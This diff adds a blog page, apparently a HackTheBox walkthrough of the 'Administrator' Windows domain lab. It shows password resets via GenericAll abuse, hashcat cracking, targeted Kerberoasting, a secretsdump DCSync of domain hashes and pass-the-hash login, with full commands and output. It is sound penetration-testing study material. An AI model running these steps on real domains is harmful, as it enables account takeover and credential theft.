@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta http-equiv="X-UA-Compatible" content="ie=edge" />
+<link rel="stylesheet" href="/_assets/main.css" />
+
+    <title>Windows - Medium - Administrator - abno&#39;s blog</title>
+  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
+  <body>
+    <div class="main">
+      <nav class="navigation">
+        <a href="/">abno&#39;s blog</a>
+      </nav>
+      <article>
+        <header>
+          <h1 class="article-title">Windows - Medium - Administrator</h1>
+          <div class="article-info">
+            <div>
+              <span
+                >Created At：<time datetime="1754921243915"
+                  >2025-08-11 16:07</time
+                ></span
+              >
+              <span
+                >Updated At：<time datetime="1754998698672"
+                  >2025-08-12 13:38</time
+                ></span
+              >
+            </div>
+            
+          </div>
+        </header>
+        <div class="article-content markdown-body"><h1 id="recon">Recon</h1>
+<p>Quick nmap finds domain <code>administrator.htb</code> , ftp, kerberos</p>
+<div><pre class="hljs"><code>PORT      STATE SERVICE       VERSION
+<span class="hljs-number">21</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  ftp           Microsoft ftpd
+<span class="hljs-operator">|</span> ftp<span class="hljs-operator">-</span>syst: 
+<span class="hljs-operator">|</span>_  SYST: Windows_NT
+<span class="hljs-number">53</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  domain        Simple DNS Plus
+<span class="hljs-number">88</span><span class="hljs-operator">/</span>tcp    <span class="hljs-keyword">open</span>  kerberos<span class="hljs-operator">-</span>sec  Microsoft Windows Kerberos (server <span class="hljs-type">time</span>: <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-11</span> <span class="hljs-number">21</span>:<span class="hljs-number">17</span>:<span class="hljs-number">33</span>Z)
+<span class="hljs-number">135</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">139</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  netbios<span class="hljs-operator">-</span>ssn   Microsoft Windows netbios<span class="hljs-operator">-</span>ssn
+<span class="hljs-number">389</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">445</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  microsoft<span class="hljs-operator">-</span>ds?
+<span class="hljs-number">464</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  kpasswd5?
+<span class="hljs-number">593</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">636</span><span class="hljs-operator">/</span>tcp   <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">3268</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  ldap          Microsoft Windows Active Directory LDAP (Domain: administrator.htb0., Site: <span class="hljs-keyword">Default</span><span class="hljs-operator">-</span><span class="hljs-keyword">First</span><span class="hljs-operator">-</span>Site<span class="hljs-operator">-</span>Name)
+<span class="hljs-number">3269</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  tcpwrapped
+<span class="hljs-number">5985</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span>
+<span class="hljs-number">9389</span><span class="hljs-operator">/</span>tcp  <span class="hljs-keyword">open</span>  mc<span class="hljs-operator">-</span>nmf        .NET Message Framing
+<span class="hljs-number">47001</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  http          Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP<span class="hljs-operator">/</span>UPnP)
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>title: <span class="hljs-keyword">Not</span> Found
+<span class="hljs-operator">|</span>_http<span class="hljs-operator">-</span>server<span class="hljs-operator">-</span>header: Microsoft<span class="hljs-operator">-</span>HTTPAPI<span class="hljs-operator">/</span><span class="hljs-number">2.0</span>
+<span class="hljs-number">49664</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49665</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49666</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49667</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">49668</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53151</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53158</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  ncacn_http    Microsoft Windows RPC <span class="hljs-keyword">over</span> HTTP <span class="hljs-number">1.0</span>
+<span class="hljs-number">53163</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53166</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53186</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+<span class="hljs-number">53219</span><span class="hljs-operator">/</span>tcp <span class="hljs-keyword">open</span>  msrpc         Microsoft Windows RPC
+Device type: general purpose<span class="hljs-operator">|</span>specialized
+<span class="hljs-keyword">Running</span> (JUST GUESSING): Microsoft Windows <span class="hljs-number">2022</span><span class="hljs-operator">|</span><span class="hljs-number">2012</span><span class="hljs-operator">|</span><span class="hljs-number">11</span><span class="hljs-operator">|</span><span class="hljs-number">2016</span><span class="hljs-operator">|</span><span class="hljs-number">2019</span><span class="hljs-operator">|</span><span class="hljs-number">10</span> (<span class="hljs-number">91</span><span class="hljs-operator">%</span>)</code></pre></div>
+<p>We can then run scan with bloodhound.py and import it into bloodhound.</p>
+<p><code>python3 bloodhound.py -d administrator.htb -c All -u olivia -p 'ichliebedich' -ns $ip -k</code></p>
+<h1 id="foothold">Foothold</h1>
+<p>We can see that olivia has GenericAll privs over michael. The <a title="https://bloodhound.specterops.io/resources/edges/generic-all#genericall" href="https://bloodhound.specterops.io/resources/edges/generic-all#genericall">manual for bloodhound</a> is helpful here.</p>
+<p><img src="/_resources/51b50c10aad047ac8753eac5c10b0a78.png" /></p>
+<p>There is also built in help.</p>
+<p><img src="/_resources/5db1c612d1f3478ab46f41e73bb2e4f0.png" /></p>
+<p>We can then change michael’s password with <code>net user michael Password1 /domain</code>.</p>
+<p><img src="/_resources/f94600cf030445a581302c8b1b685e64.png" /></p>
+<p>We can then mark Michael as pwned and see what priv’s he has. We can then change password for benjamin the same way.</p>
+<div><pre class="hljs"><code><span class="hljs-built_in">Import-Module</span> ActiveDirectory
+<span class="hljs-variable">$SecPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'Password1'</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>
+<span class="hljs-variable">$Cred</span> = <span class="hljs-built_in">New-Object</span> System.Management.Automation.PSCredential(<span class="hljs-string">'ADMINISTRATOR\michael'</span>, <span class="hljs-variable">$SecPassword</span>)
+<span class="hljs-variable">$UserPassword</span> = <span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'Password1'</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>
+<span class="hljs-built_in">Set-ADAccountPassword</span> <span class="hljs-literal">-Identity</span> benjamin <span class="hljs-literal">-NewPassword</span> (<span class="hljs-built_in">ConvertTo-SecureString</span> <span class="hljs-string">'Password1'</span> <span class="hljs-literal">-AsPlainText</span> <span class="hljs-literal">-Force</span>) <span class="hljs-literal">-Reset</span> <span class="hljs-literal">-Server</span> administrator.htb <span class="hljs-literal">-Credential</span> <span class="hljs-variable">$Cred</span></code></pre></div>
+<p>Then in Bloodhound we can see that benjamin is one of the share moderators.</p>
+<p><img src="/_resources/5768fe3fa4f24a41a4ddc1dcee5cfa77.png" /></p>
+<p><img src="/_resources/514585612f084ab59e49675419923513.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ file Backup<span class="hljs-selector-class">.psafe3</span> 
+Backup<span class="hljs-selector-class">.psafe3</span>: Password Safe V3 database</code></pre></div>
+<p>We can crack it with hashcat and get password <code>tekieromucho</code>.</p>
+<p><img src="/_resources/d5eef154b72b4e91bd80b33c5fbc0d7d.png" /></p>
+<p>After opening the database, we get new creds.</p>
+<p><img src="/_resources/05c4ddae238749ff8a5d042c7018aedf.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-attribute">alexander</span> UrkIbagoxMyUGw0aPlj9B0AXSea4Sw
+emily UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+emma WwANQWnmJnGV07WQN8bMS7FMAbjNur</code></pre></div>
+<p>We can check if they are valid with <code>netexec smb 10.129.201.124 -u user.txt -p pass.txt</code>.</p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-selector-attr">[★]</span>$ netexec smb <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span> -u users<span class="hljs-selector-class">.txt</span> -<span class="hljs-selector-tag">p</span> pass<span class="hljs-selector-class">.txt</span>
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[*]</span> Windows Server <span class="hljs-number">2022</span> Build <span class="hljs-number">20348</span> x64 (name:DC) (domain:administrator.htb) (signing:True) (SMBv1:False)
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\alexander:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\emily:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\emma:UrkIbagoxMyUGw0aPlj9B0AXSea4Sw STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[-]</span> administrator.htb\alexander:UXLCI5iETUsIBoFVTj8yQFKoHjXmb STATUS_LOGON_FAILURE 
+SMB         <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>  <span class="hljs-number">445</span>    DC               <span class="hljs-selector-attr">[+]</span> administrator.htb\emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb </code></pre></div>
+<p>We finally get to log in as emily and get user flag.</p>
+<p><code>evil-winrm -i 10.129.201.124 -u emily -p UXLCI5iETUsIBoFVTj8yQFKoHjXmb</code></p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We can go kerberoasting.</p>
+<p><img src="/_resources/e312cebc766d4c17a2aac5b8c8b85385.png" /></p>
+<p><img src="/_resources/f9be8af778934cb6bdecbd9ad0d7da7e.png" /></p>
+<p>We dont have to execute this manualy, ready-to-go scripts are availeable.<br />
+<a title="https://github.com/ShutdownRepo/targetedKerberoast" href="https://github.com/ShutdownRepo/targetedKerberoast">https://github.com/ShutdownRepo/targetedKerberoast</a></p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-6owi1lm3xr]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python3 targetedKerberoast<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span> -d administrator<span class="hljs-selector-class">.htb</span> -u emily -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span> -U ethan<span class="hljs-selector-class">.txt</span>
+<span class="hljs-selector-attr">[*]</span> Starting kerberoast attacks
+<span class="hljs-selector-attr">[*]</span> Fetching usernames from file
+<span class="hljs-selector-attr">[!]</span> Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)</code></pre></div>
+<p>We can fix the clock error running <code>sudo ntpdate 10.129.201.124</code></p>
+<p><code>python3 targetedKerberoast.py --dc-ip 10.10.11.42 -d administrator.htb -u emily -p 'UXLCI5iETUsIBoFVTj8yQFKoHjXmb' -U ethan.txt</code></p>
+<div><pre class="hljs"><code>┌─<span class="hljs-selector-attr">[eu-dedivip-1]</span>─<span class="hljs-selector-attr">[10.10.14.49]</span>─<span class="hljs-selector-attr">[abno525@htb-6owi1lm3xr]</span>─<span class="hljs-selector-attr">[~/my_data]</span>
+└──╼ <span class="hljs-selector-attr">[★]</span>$ python3 targetedKerberoast<span class="hljs-selector-class">.py</span> <span class="hljs-attr">--dc-ip</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span> -d administrator<span class="hljs-selector-class">.htb</span> -u emily -<span class="hljs-selector-tag">p</span> <span class="hljs-string">'UXLCI5iETUsIBoFVTj8yQFKoHjXmb'</span> -U ethan<span class="hljs-selector-class">.txt</span>
+<span class="hljs-selector-attr">[*]</span> Starting kerberoast attacks
+<span class="hljs-selector-attr">[*]</span> Fetching usernames from file
+<span class="hljs-selector-attr">[+]</span> Printing hash <span class="hljs-keyword">for</span> (ethan)
+<span class="hljs-variable">$krb5tgs</span>$<span class="hljs-number">23</span>$*ethan<span class="hljs-variable">$ADMINISTRATOR</span>.HTB<span class="hljs-variable">$administrator</span>.htb/ethan*<span class="hljs-variable">$bce085abb60d</span>&lt;snip&gt;ebf04e96810e5089af19b7e5aabf84bcc4382f67fafb06ff77a236d9a321fc68ebc258efb</code></pre></div>
+<p>We can then again crack it with <code>hashcat -a 0 -m 13100 ethan /usr/share/wordlists/rockyou.txt.gz</code>. -&gt; password: <code>limpbizkit</code>.</p>
+<p><img src="/_resources/12078b9717c54e02a48fc9dbe0d47356.png" /></p>
+<p>We can perform a dcsync attack.</p>
+<p><img src="/_resources/6e36af65694844d4ab1c475ef7a83343.png" /></p>
+<div><pre class="hljs"><code>└──╼ [★]$ secretsdump.py -just-dc ADMINISTRATOR.HTB/ethan@<span class="hljs-number">10.129</span>.<span class="hljs-number">201.124</span>
+Impacket v0.<span class="hljs-number">13.0</span>.dev0+<span class="hljs-number">20250130.104306</span>.<span class="hljs-number">0</span>f4b866 - Copyright Fortra, LLC <span class="hljs-keyword">and</span> its affiliated companies 
+
+Password:
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] <span class="hljs-keyword">Using</span> the DRSUAPI <span class="hljs-function"><span class="hljs-keyword">method</span> <span class="hljs-title">to</span> <span class="hljs-title">get</span> <span class="hljs-title">NTDS</span>.<span class="hljs-title">DIT</span> <span class="hljs-title">secrets</span>
+<span class="hljs-title">Administrator</span>:</span><span class="hljs-number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="hljs-number">3</span>dc553ce4b9fd20bd016e098d2d2fd2e:::
+&lt;snip&gt;</code></pre></div>
+<p>Now we can login with admins hash <code>3dc553ce4b9fd20bd016e098d2d2fd2e</code>.</p>
+<p><img src="/_resources/2dd88d3b9b9c4317bf8aeb52b3b94a8f.png" /></p>
+</div>
+      </article>
+    </div>
+  </body>
+</html>
